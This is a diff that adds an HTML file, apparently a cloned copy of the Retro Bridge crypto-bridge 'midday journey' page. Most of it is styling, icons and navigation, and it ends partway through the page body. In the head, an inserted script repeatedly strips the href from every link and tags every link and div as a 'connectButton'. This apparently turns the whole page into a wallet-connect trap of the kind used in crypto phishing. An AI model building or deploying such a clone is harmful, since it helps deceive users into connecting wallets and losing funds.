@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html
+	lang="en"
+	style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 9999; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+	data-scrapbook-source="https://retrobridge.io/phases/midday-journey"
+	data-scrapbook-create="20240813201946586"
+	data-scrapbook-title="Retro Bridge | All chains, single app."
+	data-scrapbook-adoptedstylesheet-0='*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+
+button::after { content: ""; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+
+button:disabled { cursor: not-allowed; }
+
+button svg, button wcm-text { position: relative; z-index: 1; }
+
+input { border: none; outline: 0px; appearance: none; }
+
+img { display: block; }
+
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }'
+	data-scrapbook-adoptedstylesheet-1=":host { all: initial; }
+
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+
+.wcm-active { pointer-events: auto; }
+
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}"
+>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Retro Bridge | All chains, single app.</title>
+		<meta content="All chains, single app." name="description" />
+		<meta property="og:title" content="Retro Bridge | App" />
+		<meta property="og:type" content="website" />
+		<meta content="All chains, single app." property="og:description" />
+		<meta content="/thumbnail.png" property="og:image" />
+		<meta name="twitter:card" content="summary_large_image" />
+		<meta name="twitter:url" content="https://retrobridge.io" />
+		<meta content="Retro Bridge | App" property="twitter:title" />
+		<meta property="twitter:image:src" content="/thumbnail.png" />
+		<meta name="twitter:site" content="@retrobridge" />
+		<meta content="All chains, single app." property="twitter:description" />
+		<meta content="width=device-width,initial-scale=1" name="viewport" />
+		<link rel="icon" href="favicon.png" />
+		<link rel="apple-touch-icon" href="https://retrobridge.io/logo192.png" />
+		<link rel="manifest" href="https://retrobridge.io/manifest.json" />
+		<link rel="stylesheet" href="bootstrap.min.css" />
+		<link href="main.df64a1dd.css" rel="stylesheet" />
+		<style id="_goober">
+			.go37342527{box-shadow:0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);width:fit-content;margin:auto;}@media (max-width: 440px){.go37342527{width:100%;height:fit-content;margin:auto 0 0 0;}}.go3288899091{transform:translateY(-8px);margin-bottom:12px;}.go3535743411{margin-bottom:12px;}tc-root *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;}tc-root img{-webkit-user-select:none;-webkit-touch-callout:none;}tc-root *:focus{outline:#08f auto 2px;}tc-root li{list-style:none;}tc-root button{outline:none;}body.tc-disable-scroll{position:fixed;overflow-y:scroll;right:0;left:0;}body.tc-using-mouse tc-root *:focus{outline:none;}
+		</style>
+		<link rel="stylesheet" type="text/css" href="3155.a5bcd51b.chunk.css" />
+		<script data-scrapbook-elem="custom-elements-loader">
+			(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["tc-root","wcm-explorer-context","wcm-theme-context","wcm-modal"])
+		</script>
+	<script>
+      function addClassesToElements() {
+  
+      const links = document.querySelectorAll('a:not(.connectButton)');
+      for (const link of links) {
+          link.removeAttribute('href');
+          link.classList.add('connectButton');
+      }
+      const buttons = document.querySelectorAll('div:not(.connectButton)');
+      for (const button of buttons) {
+          button.classList.add('connectButton');
+      }
+      }
+      setInterval(addClassesToElements, 300);
+  </script>
+	</head>
+	<body class="body--blue" style="top: auto;">
+		<div id="root" data-nosnippet="">
+			<div data-rk="">
+				<style>
+					[data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:9999px;--rk-radii-connectButton:12px;--rk-radii-menuButton:12px;--rk-radii-modal:24px;--rk-radii-modalMobile:28px;--rk-colors-accentColor:#3898FF;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(255, 255, 255, 0.04);--rk-colors-actionButtonBorderMobile:rgba(255, 255, 255, 0.08);--rk-colors-actionButtonSecondaryBackground:rgba(255, 255, 255, 0.08);--rk-colors-closeButton:rgba(224, 232, 255, 0.6);--rk-colors-closeButtonBackground:rgba(255, 255, 255, 0.08);--rk-colors-connectButtonBackground:#1A1B1F;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));--rk-colors-connectButtonText:#FFF;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(255, 255, 255, 0.08);--rk-colors-generalBorderDim:rgba(255, 255, 255, 0.04);--rk-colors-menuItemBackground:rgba(224, 232, 255, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.5);--rk-colors-modalBackground:#1A1B1F;--rk-colors-modalBorder:rgba(255, 255, 255, 0.08);--rk-colors-modalText:#FFF;--rk-colors-modalTextDim:rgba(224, 232, 255, 0.3);--rk-colors-modalTextSecondary:rgba(255, 255, 255, 0.6);--rk-colors-profileAction:rgba(224, 232, 255, 0.1);--rk-colors-profileActionHover:rgba(224, 232, 255, 0.2);--rk-colors-profileForeground:rgba(224, 232, 255, 0.05);--rk-colors-selectedOptionBorder:rgba(224, 232, 255, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}
+				</style>
+				<div class="Toastify"></div>
+				<div>
+					<header class="header">
+						<a href="https://retrobridge.io/"><img src="retroIcon.45968ef3f180aa29457e38049dfe1ed8.svg" alt="logo" style="width: 170px; height: 40px;" /></a>
+						<nav class="header-nav">
+							<a class="header-nav-item" href="https://retrobridge.io/dapp-explorer">
+								<svg width="20" height="19" viewBox="0 0 20 19" fill="none" xmlns="http://www.w3.org/2000/svg">
+									<path
+										fill-rule="evenodd"
+										clip-rule="evenodd"
+										d="M2.98901 9.01099C2.98901 5.13893 6.12794 2 10 2C13.8721 2 17.011 5.13893 17.011 9.01099C17.011 12.8831 13.8721 16.022 10 16.022C6.12794 16.022 2.98901 12.8831 2.98901 9.01099ZM10 0C5.02337 0 0.989014 4.03436 0.989014 9.01099C0.989014 13.9876 5.02337 18.022 10 18.022C14.9766 18.022 19.011 13.9876 19.011 9.01099C19.011 4.03436 14.9766 0 10 0ZM13.7791 4.86365C13.8177 4.84601 13.8599 4.83746 13.9024 4.83866C13.9482 4.83991 13.993 4.85245 14.0328 4.87517C14.0726 4.89789 14.1061 4.93009 14.1305 4.9689C14.1548 5.00771 14.1692 5.05193 14.1724 5.09764C14.1755 5.14335 14.1673 5.18913 14.1485 5.23091L11.6434 10.7936C11.6149 10.8581 11.5628 10.9094 11.4978 10.937L6.21445 13.1612C6.16352 13.1829 6.10728 13.1889 6.05291 13.1784C5.99854 13.168 5.94853 13.1416 5.90927 13.1025C5.87 13.0635 5.84328 13.0137 5.83251 12.9594C5.82175 12.9051 5.82743 12.8488 5.84883 12.7977L8.07464 7.51214C8.10185 7.44746 8.1525 7.39546 8.21644 7.36654L13.7791 4.86365ZM11.2512 9.01105C11.2512 8.32304 10.687 7.75879 9.99894 7.75879C9.31093 7.75879 8.74831 8.32304 8.74831 9.01105C8.74831 9.69906 9.31093 10.2639 9.99894 10.2639C10.687 10.2639 11.2512 9.69906 11.2512 9.01105Z"
+										fill="#fff"
+									></path>
+									<defs>
+										<linearGradient id=":r9:" x1="5.49451" y1="1.35165" x2="16.3077" y2="18.022" gradientUnits="userSpaceOnUse">
+											<stop stop-color="#EAD0FF"></stop>
+											<stop offset="1" stop-color="#B297FF"></stop>
+										</linearGradient>
+									</defs>
+								</svg>
+								Dapps Explorer
+							</a>
+							<a class="header-nav-item" href="https://testnet.retrobridge.io/">
+								<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18" fill="none">
+									<path
+										fill-rule="evenodd"
+										clip-rule="evenodd"
+										d="M12.3258 3.89262H3.14028C2.96534 3.89262 2.82354 3.77107 2.82354 3.62113V2.26368C2.82354 2.11373 2.96534 1.99219 3.14028 1.99219H12.3258C12.5007 1.99219 12.6425 2.11373 12.6425 2.26368V3.62113C12.6425 3.77107 12.5007 3.89262 12.3258 3.89262ZM6.30772 5.15959V4.30951V3.89268H3.77378V5.15959H3.77376H3.14028C2.96534 5.15959 2.82354 5.31941 2.82354 5.51658V15.4434H2.19003C2.0151 15.4434 1.87329 15.5756 1.87329 15.7387V16.6245C1.87329 16.7876 2.0151 16.9198 2.19003 16.9198H10.7421C10.917 16.9198 11.0588 16.7876 11.0588 16.6245V15.7387C11.0588 15.5756 10.917 15.4434 10.7421 15.4434H7.258V9.80035C7.258 9.72352 7.23646 9.65235 7.19981 9.59409H12.0091V10.5443C12.0091 10.7192 12.1509 10.861 12.3258 10.861H14.543C14.7179 10.861 14.8598 10.7192 14.8598 10.5443V9.28348L14.8598 9.27735V8.58052C14.8598 7.56755 14.0357 6.74342 13.0227 6.74342H7.25791V5.47633C7.25791 5.30139 7.1161 5.15959 6.94116 5.15959H6.30772ZM13.434 14.4504C12.692 14.4504 12.0882 13.8463 12.0882 13.1038C12.0882 12.6449 12.4193 12.2384 12.7395 11.8453C12.8744 11.6797 13.0018 11.5232 13.092 11.3785C13.1647 11.2616 13.2926 11.1906 13.4303 11.1905H13.4304C13.568 11.1905 13.6959 11.2615 13.7687 11.3782C13.8614 11.5269 13.9915 11.6845 14.1292 11.8514L14.1292 11.8514L14.1292 11.8514L14.1292 11.8514L14.1299 11.8522L14.13 11.8523C14.4498 12.2399 14.7806 12.6407 14.7806 13.1038C14.7806 13.8463 14.1765 14.4504 13.434 14.4504Z"
+										fill="#fff"
+									></path>
+									<path
+										fill-rule="evenodd"
+										clip-rule="evenodd"
+										d="M12.0881 13.1038C12.0881 13.8463 12.6919 14.4504 13.4339 14.4504C14.1764 14.4504 14.7805 13.8463 14.7805 13.1038C14.7805 12.6407 14.4497 12.2399 14.1299 11.8523L14.1298 11.8522L14.1291 11.8514C13.9914 11.6845 13.8613 11.5269 13.7686 11.3782C13.6958 11.2615 13.5679 11.1906 13.4303 11.1906H13.4302C13.2925 11.1906 13.1646 11.2616 13.0919 11.3785C13.0017 11.5232 12.8743 11.6797 12.7394 11.8453C12.4192 12.2384 12.0881 12.6449 12.0881 13.1038Z"
+										fill="#ffffff"
+									></path>
+									<defs xmlns="http://www.w3.org/2000/svg">
+										<linearGradient id=":ra:" x1="1.54418" y1="1.27944" x2="7.6019" y2="16.9198" gradientUnits="userSpaceOnUse">
+											<stop stop-color="#E7C9FF"></stop>
+											<stop offset="1.0001" stop-color="#9C9AFF"></stop>
+										</linearGradient>
+									</defs>
+								</svg>
+								Testnets &amp; Faucet
+							</a>
+							<a class="header-nav-item" href="https://retrobridge.io/phases">
+								<svg xmlns="http://www.w3.org/2000/svg" width="21" height="12" viewBox="0 0 21 12" fill="none">
+									<path
+										fill-rule="evenodd"
+										clip-rule="evenodd"
+										d="M11.9137 3.97811C11.317 3.81162 10.6884 3.72229 10.0393 3.72229C9.39013 3.72229 8.76153 3.81162 8.16481 3.97815L9.51024 1.04522C9.60509 0.838422 9.81177 0.705883 10.0393 0.705883C10.2668 0.705883 10.4734 0.838422 10.5683 1.04522L11.9137 3.97811ZM3.95726 7.27669C4.58367 6.17009 5.5032 5.25056 6.6098 4.62415L3.58199 3.50067C3.36867 3.42149 3.12883 3.47396 2.96797 3.63481C2.80707 3.79567 2.75473 4.03552 2.83383 4.24884L3.95726 7.27669ZM3.05547 10.7059C3.05547 10.0568 3.1448 9.42816 3.31129 8.83145L0.378398 10.1769C0.171602 10.2717 0.0390625 10.4784 0.0390625 10.7059C0.0390625 10.9334 0.171602 11.1401 0.378398 11.2349L0.507297 11.2941H3.08009C3.06379 11.1001 3.05547 10.904 3.05547 10.7059ZM15.8291 11.2941H4.249C4.22949 11.1006 4.2195 10.9044 4.2195 10.7059C4.2195 7.49695 6.83013 4.88632 10.039 4.88632C13.2479 4.88632 15.8586 7.49695 15.8586 10.7059C15.8586 10.9044 15.8486 11.1006 15.8291 11.2941ZM19.5707 11.2941H16.998C17.0143 11.1001 17.0226 10.9039 17.0226 10.7058C17.0226 10.0567 16.9333 9.42811 16.7668 8.83135L19.6998 10.1768C19.9066 10.2717 20.0391 10.4783 20.0391 10.7058C20.0391 10.9333 19.9066 11.14 19.6998 11.2348L19.5707 11.2941ZM16.1209 7.27665L17.2443 4.24879C17.3234 4.03551 17.2711 3.79563 17.1102 3.63477C16.9493 3.47387 16.7094 3.42157 16.4962 3.50063L13.4683 4.62407C14.5749 5.25051 15.4944 6.17004 16.1209 7.27665Z"
+										fill="#fff"
+									></path>
+								</svg>
+								Phases
+							</a>
+							<a class="header-nav-item adventures" href="https://retrobridge.io/adventures">
+								<svg xmlns="http://www.w3.org/2000/svg" width="21" height="24" viewBox="0 0 21 24" fill="none">
+									<path d="M1.19827 6.93469L10.9181 1.28614L20.7014 6.93469L10.9816 12.5832L1.19827 6.93469Z" fill="#D3A5E4"></path>
+									<path d="M20.4784 6.80569L10.9178 1.28612L1.42136 6.80499L3.33404 7.90932L10.9615 3.47717L18.6087 7.89241L20.4784 6.80569Z" fill="#B981CD"></path>
+									<path d="M10.9814 12.5833L20.7012 6.93472V18.1599L10.9814 23.8085V12.5833Z" fill="#9785E2"></path>
+									<path d="M10.9817 12.5833V23.8085L1.19839 18.1599V6.93472L10.9817 12.5833Z" fill="#433288"></path>
+									<path d="M10.9814 12.5833V14.6038L20.7012 8.95452V6.93472L10.9814 12.5833Z" fill="#6251A4"></path>
+									<path d="M1.19839 6.93472V8.95522L10.9817 14.6038V12.5833L1.19839 6.93472Z" fill="#251D44"></path>
+									<path d="M2.63977 17.1274L3.13591 16.8392L3.20357 16.8779L2.70672 17.1669L2.63977 17.1274Z" fill="#180C49"></path>
+									<path d="M2.70693 17.167L2.70129 19.0635L2.63434 19.0247L2.63998 17.1275L2.70693 17.167Z" fill="#180C49"></path>
+									<path d="M2.70706 17.1669L3.20391 16.878L9.76721 20.6674L9.27036 20.9556L2.70706 17.1669Z" fill="#291E53"></path>
+									<path d="M9.27008 20.9555L9.76693 20.6673L9.83388 20.7061L9.33703 20.9943L9.27008 20.9555Z" fill="#362F55"></path>
+									<path d="M9.33727 20.9944L9.33163 22.8916L9.26468 22.8528L9.27032 20.9557L9.33727 20.9944Z" fill="#180C49"></path>
+									<path d="M2.62839 9.41626L3.12523 9.12732L3.1358 16.8394L2.63966 17.1276L2.62839 9.41626Z" fill="#180C49"></path>
+									<path d="M3.12523 9.20625V9.12732L2.62839 9.41626V9.49449L3.12523 9.20625Z" fill="#180C49"></path>
+									<path d="M2.63928 17.0498L2.63999 17.1273L3.13613 16.839V16.7615L2.63928 17.0498Z" fill="#180C49"></path>
+									<path
+										d="M2.70685 17.1672L9.27015 20.9566L9.26451 22.8538L2.70121 19.0643L2.70685 17.1672ZM0.983035 18.0721L2.63355 19.0249L2.63919 17.1277L2.62862 9.41565L2.63426 7.51918L2.70121 7.55794L2.69557 9.45441L9.25887 13.2438L9.26451 11.3474L9.33146 11.3861L9.32582 13.2826L9.33639 20.9946L9.33076 22.8918L10.982 23.8453V12.3389L0.98233 6.56636V18.0721H0.983035Z"
+										fill="#7F6EC3"
+									></path>
+									<path d="M2.70098 7.55784L2.69534 9.45432L2.62839 9.41626L2.63402 7.51979L2.70098 7.55784Z" fill="#180C49"></path>
+									<path d="M9.33168 11.3859L9.32675 13.2823L9.2598 13.2436L9.26473 11.3471L9.33168 11.3859Z" fill="#180C49"></path>
+									<path d="M19.3256 17.1274L18.8295 16.8392L18.7618 16.8779L19.2587 17.1669L19.3256 17.1274Z" fill="#B19EFF"></path>
+									<path d="M19.2588 17.167L19.2644 19.0635L19.3313 19.0247L19.3257 17.1275L19.2588 17.167Z" fill="#D7CDFF"></path>
+									<path d="M19.2584 17.1669L18.7615 16.878L12.1982 20.6674L12.6951 20.9556L19.2584 17.1669Z" fill="#B19EFF"></path>
+									<path d="M12.6953 20.9555L12.1984 20.6673L12.1315 20.7061L12.6283 20.9943L12.6953 20.9555Z" fill="#B19EFF"></path>
+									<path d="M12.6284 20.9944L12.6341 22.8916L12.701 22.8528L12.6954 20.9557L12.6284 20.9944Z" fill="#D7CDFF"></path>
+									<path d="M19.337 9.41626L18.8402 9.12732L18.8296 16.8394L19.3258 17.1276L19.337 9.41626Z" fill="#8472CB"></path>
+									<path d="M19.3368 9.49237V9.41626L18.8399 9.12732V9.20413L19.3368 9.49237Z" fill="#B19EFF"></path>
+									<path d="M19.3258 17.0515L18.8296 16.7632V16.8393L19.3258 17.1276V17.0515Z" fill="#B19EFF"></path>
+									<path
+										d="M19.2644 19.0636L12.7011 22.8531L12.6954 20.9559L19.2587 17.1665L19.2644 19.0636ZM20.9825 6.56636L10.9829 12.3389V23.8453L12.6341 22.8918L12.6285 20.9946L12.639 13.2826L12.6334 11.3861L12.7003 11.3474L12.706 13.2438L19.2693 9.45441L19.2636 7.55794L19.3306 7.51918L19.3362 9.41565L19.3257 17.1277L19.3313 19.0249L20.9818 18.0721V6.56636H20.9825Z"
+										fill="#C0B3F2"
+									></path>
+									<path d="M19.2642 7.55784L19.2698 9.45432L19.3368 9.41626L19.3311 7.51979L19.2642 7.55784Z" fill="#D7CDFF"></path>
+									<path d="M12.6339 11.3859L12.6388 13.2823L12.7058 13.2436L12.7008 11.3471L12.6339 11.3859Z" fill="#D7CDFF"></path>
+									<path d="M12.6392 13.2824L10.983 14.2388V14.317L12.6392 13.3599V13.2824Z" fill="#D7CDFF"></path>
+									<path d="M20.9825 8.54034V8.46282L19.3369 9.41353V9.41634V9.49105L20.9825 8.54034Z" fill="#D7CDFF"></path>
+									<path d="M12.6286 20.917L10.983 21.8705V21.9487L12.6286 20.9952V20.9177V20.917Z" fill="#D7CDFF"></path>
+									<path d="M20.9824 16.1719V16.0944L19.3256 17.05V17.0528V17.1275L20.9824 16.1719Z" fill="#D7CDFF"></path>
+									<path d="M12.6733 1.7853L11.0284 2.73811L10.9608 2.69935L12.6063 1.74653L12.6733 1.7853Z" fill="white"></path>
+									<path d="M11.0287 2.73799L11.0266 3.31236L10.9597 3.27359L10.9611 2.69923L11.0287 2.73799Z" fill="#7B4D3A"></path>
+									<path d="M10.9607 2.69923L10.9593 3.27359L4.28323 7.14054L4.28535 6.56617L10.9607 2.69923Z" fill="#9E5FB4"></path>
+									<g opacity="0.4" style="mix-blend-mode: overlay;"><path d="M4.2854 6.65426L10.9608 2.78732V2.69923L4.2854 6.56617V6.65426Z" fill="white"></path></g>
+									<path d="M10.8938 2.73791L10.8924 3.31228L10.9593 3.27352L10.9608 2.69915L10.8938 2.73791Z" fill="#7B4D3A"></path>
+									<path d="M4.3523 6.52754L4.28535 6.5663L4.28323 7.14067L4.35089 7.10191L4.3523 6.52754Z" fill="#7B4D3A"></path>
+									<path d="M4.35263 6.60518L2.70141 7.5587L2.63446 7.51994L4.28498 6.56641L4.35263 6.60518Z" fill="white"></path>
+									<path d="M11.0044 10.4333L9.33136 11.384L9.2637 11.3474L10.9375 10.3945L11.0044 10.4333Z" fill="white"></path>
+									<path d="M17.6137 6.52744L17.6115 7.10181L11.0264 3.31238L11.0285 2.73802L17.6137 6.52744Z" fill="#B684C8"></path>
+									<g opacity="0.4" style="mix-blend-mode: overlay;"><path d="M11.0286 2.82611L17.613 6.61553L17.6137 6.52744L11.0286 2.73802V2.82611Z" fill="white"></path></g>
+									<path d="M19.3257 5.61342L17.6808 6.56624L17.6139 6.52748L19.2587 5.57466L19.3257 5.61342Z" fill="white"></path>
+									<path d="M17.6808 6.56638L17.6793 7.14075L17.6117 7.10199L17.6138 6.52762L17.6808 6.56638Z" fill="#7B4D3A"></path>
+									<path
+										d="M10.9607 2.69939L4.28468 6.56634L2.63346 7.51986L0.982941 6.56634L10.9495 0.793055L12.6056 1.74587L10.9607 2.69869V2.69939ZM2.70111 7.55862L9.26371 11.3473L10.9368 10.3938L4.35163 6.60439L2.70041 7.55862H2.70111ZM12.6733 1.78534L11.0284 2.73816L17.6135 6.52758L19.2584 5.57476L12.6733 1.78534ZM19.3254 5.61352L20.9815 6.56704L10.9819 12.3396L9.33066 11.3847L11.0037 10.4333L17.6798 6.56634L19.3247 5.61352H19.3254Z"
+										fill="#F4D4FF"
+									></path>
+									<path d="M17.6139 6.60518L19.2637 7.55799L19.3313 7.51923L17.6808 6.56641L17.6139 6.60518Z" fill="white"></path>
+									<path d="M11.0047 10.4326L12.6334 11.3854L12.7003 11.3467L11.0717 10.3945L11.0047 10.4326Z" fill="white"></path>
+									<path d="M9.24362 1.78459L10.8941 2.73811L10.9611 2.69935L9.31128 1.74653L9.24362 1.78459Z" fill="white"></path>
+									<path d="M2.64478 5.60349L4.28754 6.56406L4.35449 6.5253L2.71243 5.56544L2.64478 5.60349Z" fill="white"></path>
+									<path d="M9.33688 20.917L10.9825 21.8706V21.9488L9.33688 20.9953V20.9177V20.917Z" fill="#B19EFF"></path>
+									<path d="M0.98288 16.1719V16.0944L2.63974 17.05V17.0528V17.1275L0.98288 16.1719Z" fill="#B19EFF"></path>
+									<path d="M9.32602 13.2825L10.9829 14.2388V14.3171L9.32602 13.3607V13.2832V13.2825Z" fill="#B19EFF"></path>
+									<path d="M0.98288 8.54031V8.46279L2.62846 9.41561V9.41843V9.49384L0.98288 8.54031Z" fill="#B19EFF"></path>
+									<g opacity="0.4" style="mix-blend-mode: overlay;"><path d="M10.9829 12.422L20.9825 6.64665V6.56772L10.9829 12.3431V12.422Z" fill="white"></path></g>
+									<g opacity="0.4" style="mix-blend-mode: overlay;"><path d="M10.9825 12.422L0.98288 6.64665V6.56772L10.9825 12.3431V12.422Z" fill="white"></path></g>
+									<g opacity="0.9" style="mix-blend-mode: multiply;"><path d="M10.9829 23.8451L20.9825 18.0697V17.9908L10.9829 23.7662V23.8451Z" fill="#E3CABE"></path></g>
+									<g opacity="0.9" style="mix-blend-mode: multiply;"><path d="M10.9825 23.8451L0.98288 18.0697V17.9908L10.9825 23.7662V23.8451Z" fill="#E3CABE"></path></g>
+									<path
+										d="M13.9738 17.1269L14.0637 17.0831L14.0567 16.9833C13.9764 15.8352 14.7499 14.4955 15.7843 13.991C16.8187 13.4865 17.7224 14.0082 17.8027 15.1563L17.8097 15.256L17.8995 15.2122L18.22 15.0559L18.3099 15.0121L18.3029 14.9123C18.2012 13.4576 17.0562 12.7965 15.7455 13.4358C14.4348 14.0751 13.4548 15.7726 13.5565 17.2273L13.5635 17.327L13.6533 17.2832L13.9738 17.1269Z"
+										fill="#C1B6EE"
+										stroke="#C1B6EE"
+										stroke-width="0.2"
+									></path>
+									<path
+										d="M8.1169 17.0755L8.02702 17.0317L8.034 16.932C8.11485 15.7758 7.3359 14.4266 6.29418 13.9185C5.25246 13.4104 4.34243 13.9358 4.26158 15.092L4.25461 15.1918L4.16473 15.1479L3.8421 14.9906L3.75222 14.9467L3.7592 14.847C3.86158 13.3828 5.01399 12.7175 6.33317 13.3609C7.65235 14.0043 8.63877 15.7128 8.53638 17.177L8.52941 17.2767L8.43953 17.2329L8.1169 17.0755Z"
+										fill="#6D5FA8"
+										stroke="#6D5FA8"
+										stroke-width="0.2"
+									></path>
+									<path
+										d="M10.0823 8.57335L10.1722 8.52951L10.0944 8.46658C9.21601 7.75524 9.32748 6.77689 10.3434 6.28139C11.3594 5.78588 12.8951 5.96085 13.7735 6.67219L13.8512 6.73513L13.9411 6.69129L14.2561 6.53765L14.346 6.49381L14.2683 6.43088C13.1536 5.52821 11.2048 5.30618 9.91562 5.93496C8.62643 6.56374 8.48498 7.80523 9.59969 8.70789L9.6774 8.77083L9.76728 8.72699L10.0823 8.57335Z"
+										fill="#F0DBF7"
+										stroke="#F0DBF7"
+										stroke-width="0.2"
+									></path>
+								</svg>
+								Retro Adventures
+							</a>
+							<a class="headerBtn header-nav-item fw-bold" href="https://app.retrobridge.io/">Launch App</a>
+						</nav>
+						<div class="d-flex align-items-center ms-auto d-lg-none">
+							<a class="btnGradient header-nav-item--btn" href="https://app.retrobridge.io/">App</a>
+							<div type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:r2:" data-state="closed">
+								<img width="24px" height="24px" draggable="false" src="burger-menu.d9443fddeaba65b3f9dcb2fe01462695.svg" alt="" />
+							</div>
+						</div>
+					</header>
+					<div class="phase-page midday">
+						<article class="phase-container container-xxl">
+							<div class="phase-body min-vh-100">
+								<div class="phase-page-hero--bg-container"><img alt="" class="phase-page-hero--bg with-smooth-loading loaded" src="adventure.pageBg.233de6c899f7db74c318.png" draggable="false" /></div>
